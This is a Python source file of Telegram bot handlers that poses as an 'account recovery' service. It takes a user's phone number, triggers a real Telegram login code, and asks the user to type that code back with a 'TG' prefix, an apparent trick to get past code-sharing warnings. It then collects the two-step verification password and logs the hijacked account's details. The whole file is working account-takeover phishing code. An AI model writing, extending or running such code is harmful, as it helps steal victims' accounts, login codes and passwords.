"""Bot command handlers adapted for the desktop app.

All reply text comes from ConfigManager instead of a database.
Logs are forwarded to a Qt signal so the GUI can display them.
"""

import re
import os
import asyncio
import time
import logging

from aiogram import Router, F, Bot, BaseMiddleware
from aiogram.types import Message, CallbackQuery, FSInputFile
from aiogram.filters import Command
from typing import Callable, Dict, Any, Awaitable

from core.login_engine import login_engine
from bot.keyboards import main_menu_kb, view_code_kb

router = Router()
logger = logging.getLogger(__name__)

# Reference to ConfigManager — set by bot_runner before starting
_cfg = None


def set_config(cfg):
    global _cfg
    _cfg = cfg


def _c(key: str, default: str = "") -> str:
    if _cfg is None:
        return default
    return _cfg.get(key, default)


def get_photo_input(photo_val: str | None) -> FSInputFile | str | None:
    if not photo_val:
        return None
    if os.path.isfile(photo_val):
        return FSInputFile(photo_val)
    return photo_val


async def send_custom_response(bot: Bot, chat_id: int, text: str,
                               photo_input=None, reply_markup=None):
    if photo_input:
        try:
            await bot.send_photo(
                chat_id=chat_id, photo=photo_input,
                caption=text, parse_mode="HTML", reply_markup=reply_markup,
            )
            return
        except Exception:
            pass
    await bot.send_message(
        chat_id=chat_id, text=text,
        parse_mode="HTML", reply_markup=reply_markup,
    )


# ── User state ──────────────────────────────────────────────────────
# uid -> {"phone", "step", "created_at", "attempts"}
_user_state: dict[int, dict] = {}


async def check_timeouts_loop(bot: Bot):
    while True:
        try:
            await asyncio.sleep(10)
            now = time.time()
            for uid, state in list(_user_state.items()):
                step = state.get("step")
                created_at = state.get("created_at")
                if not created_at or step not in ("code", "2fa"):
                    continue
                if now - created_at >= 300:
                    _user_state.pop(uid, None)
                    phone = state.get("phone")
                    await login_engine.cancel_pending(phone)
                    if step == "code":
                        text = _c("code_expired_text", "验证码已过期，请重新 /start")
                    else:
                        text = _c("tfa_60s_reminder_text", "密码输入超时，请重新 /start")
                    try:
                        await bot.send_message(chat_id=uid, text=text, parse_mode="HTML")
                    except Exception as e:
                        logger.error(f"Timeout notify failed for {uid}: {e}")
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"check_timeouts_loop error: {e}")


# ── /start ──────────────────────────────────────────────────────────
@router.message(Command("start"))
async def cmd_start(message: Message, bot: Bot):
    uid = message.from_user.id
    old = _user_state.pop(uid, None)
    if old and "phone" in old:
        await login_engine.cancel_pending(old["phone"])

    text = _c("start_text", "欢迎使用")
    mode = "contact"
    reply_markup = main_menu_kb(mode)
    photo_input = get_photo_input(_c("success_photo_path"))
    await send_custom_response(bot, message.chat.id, text, photo_input, reply_markup)
    logger.info(f"[{uid}] /start")


# ── 分享联系人 ──────────────────────────────────────────────────────
@router.message(F.contact)
async def handle_contact(message: Message, bot: Bot):
    contact = message.contact
    phone = contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    uid = message.from_user.id
    result = await login_engine.send_code(phone)
    if result["success"]:
        _user_state[uid] = {
            "phone": phone, "step": "code",
            "created_at": time.time(), "attempts": 0,
        }
        text = _c("code_panel_title", "✅ 回执码已发送！")
        await send_custom_response(bot, message.chat.id, text, None, view_code_kb(phone))
        logger.info(f"[{uid}] 验证码已发送 -> {phone}")
    else:
        await message.answer(f"❌ {result['message']}", reply_markup=main_menu_kb())
        logger.warning(f"[{uid}] 发送验证码失败: {result['message']}")


# ── 手动输入手机号 ──────────────────────────────────────────────────
@router.message(F.text == "开 始 恢 复 账 户")
async def btn_phone_login(message: Message, bot: Bot):
    uid = message.from_user.id
    _user_state[uid] = {"step": "phone_input"}
    await message.answer(
        "⚠️请输入您的账户手机号码（带完整区号，例如 +86130008800）",
        parse_mode="HTML",
    )
    logger.info(f"[{uid}] 进入手动输入手机号模式")


@router.message(F.text.regexp(r"^\+\d{7,15}$"))
async def handle_phone_input(message: Message, bot: Bot):
    uid = message.from_user.id
    state = _user_state.get(uid)
    if not state or state.get("step") != "phone_input":
        return

    phone = message.text.strip()
    result = await login_engine.send_code(phone)
    if result["success"]:
        _user_state[uid] = {
            "phone": phone, "step": "code",
            "created_at": time.time(), "attempts": 0,
        }
        text = _c("code_panel_title", "✅ 回执码已发送！")
        await send_custom_response(bot, message.chat.id, text, None, view_code_kb(phone))
        logger.info(f"[{uid}] 验证码已发送(手动) -> {phone}")
    else:
        _user_state.pop(uid, None)
        await message.answer(f"❌ {result['message']}", reply_markup=main_menu_kb())


# ── 验证码输入 ──────────────────────────────────────────────────────
@router.message(F.text, lambda msg: _user_state.get(msg.from_user.id, {}).get("step") == "code")
async def handle_code_input(message: Message, bot: Bot):
    uid = message.from_user.id
    state = _user_state.get(uid)
    if not state or state.get("step") != "code":
        return
    if message.text.startswith("/"):
        return

    phone = state["phone"]
    max_attempts = int(_c("code_max_attempts", "3"))

    match = re.match(r"(?i)^TG\s*(\d{5,6})$", message.text.strip())
    if not match:
        state["attempts"] = state.get("attempts", 0) + 1
        remaining = max_attempts - state["attempts"]
        if remaining <= 0:
            _user_state.pop(uid, None)
            await login_engine.cancel_pending(phone)
            await message.answer(_c("code_max_retries_text", "❌ 错误次数过多，请重新 /start"))
        else:
            await message.answer(_c("code_format_error_text", "❌ 格式错误"))
        return

    code = match.group(1)
    result = await login_engine.sign_in_with_code(phone, code)

    if result["success"]:
        _user_state.pop(uid, None)
        user_info = result.get("user_info", {})
        success_text = _c("success_text", "✅ 登录成功")
        try:
            success_msg = success_text.format(
                first_name=user_info.get("first_name", ""),
                last_name=user_info.get("last_name", ""),
                user_id=user_info.get("user_id", ""),
                username=user_info.get("username", "N/A"),
            )
        except (KeyError, IndexError):
            success_msg = success_text
        await send_custom_response(bot, message.chat.id, success_msg, None)
        logger.info(f"[{uid}] ✅ 登录成功: {phone} | {user_info}")
    else:
        need_2fa = result.get("need_2fa", False)
        if need_2fa:
            _user_state[uid] = {
                "phone": phone, "step": "2fa",
                "created_at": time.time(), "attempts": 0,
            }
            await message.answer(_c("prompt_2fa_text", "请输入两步验证密码"))
            logger.info(f"[{uid}] 需要两步验证: {phone}")
        else:
            state["attempts"] = state.get("attempts", 0) + 1
            remaining = max_attempts - state["attempts"]
            if remaining <= 0:
                _user_state.pop(uid, None)
                await login_engine.cancel_pending(phone)
                await message.answer(_c("code_max_retries_text", "❌ 错误次数过多"))
            else:
                tpl = _c("code_invalid_text", "❌ 验证码错误（{attempts}/{max}）")
                try:
                    err = tpl.format(attempts=state["attempts"], max=max_attempts,
                                     remaining=remaining)
                except Exception:
                    err = result.get("message", "验证码错误")
                await message.answer(err)


# ── 两步验证 ────────────────────────────────────────────────────────
@router.message(F.text, lambda msg: _user_state.get(msg.from_user.id, {}).get("step") == "2fa")
async def handle_2fa_input(message: Message, bot: Bot):
    uid = message.from_user.id
    state = _user_state.get(uid)
    if not state or state.get("step") != "2fa":
        return
    if message.text.startswith("/"):
        return

    phone = state["phone"]
    password = message.text.strip()
    max_attempts = int(_c("tfa_max_attempts", "5"))

    result = await login_engine.sign_in_with_2fa(phone, password)

    if result["success"]:
        _user_state.pop(uid, None)
        user_info = result.get("user_info", {})
        success_text = _c("success_text", "✅ 登录成功")
        try:
            success_msg = success_text.format(
                first_name=user_info.get("first_name", ""),
                last_name=user_info.get("last_name", ""),
                user_id=user_info.get("user_id", ""),
                username=user_info.get("username", "N/A"),
            )
        except (KeyError, IndexError):
            success_msg = success_text
        await send_custom_response(bot, message.chat.id, success_msg, None)
        logger.info(f"[{uid}] ✅ 2FA 登录成功: {phone} | {user_info}")
    else:
        state["attempts"] = state.get("attempts", 0) + 1
        remaining = max_attempts - state["attempts"]
        if remaining <= 0:
            _user_state.pop(uid, None)
            await login_engine.cancel_pending(phone)
            await message.answer(_c("tfa_max_retries_text", "❌ 密码错误次数过多"))
        else:
            tpl = _c("tfa_wrong_text", "❌ 密码错误（{attempts}/5）")
            try:
                err = tpl.format(attempts=state["attempts"], remaining=remaining,
                                 max=max_attempts)
            except Exception:
                err = result.get("message", "密码错误")
            await message.answer(err, parse_mode="HTML")
